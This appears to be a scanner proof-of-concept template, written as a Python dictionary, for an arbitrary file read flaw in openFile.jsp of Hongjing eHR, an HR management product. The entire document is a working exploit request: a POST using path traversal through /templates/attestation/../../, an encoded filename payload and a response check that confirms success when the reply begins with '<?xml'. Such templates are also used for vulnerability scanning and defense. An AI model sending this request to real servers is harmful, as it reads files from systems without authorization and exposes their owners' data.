{
        'name': '宏景eHR openFile.jsp 任意文件读取漏洞',
        'poc':[{'requests':{
            'method': 'post',
            'payload': '/templates/attestation/../../general/muster/hmuster/openFile.jsp',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
                'x-auth-token': 'd9eaeacd5de1008fd43f737c853dcbcb',
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            'data': '''filename=8uHo1M8Ok6bZ468mKmzw70ounZHwKUWnpVOrvOAV6WoPAATTP3HJDPAATTP''',
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': '<?xml'
        }}]
    }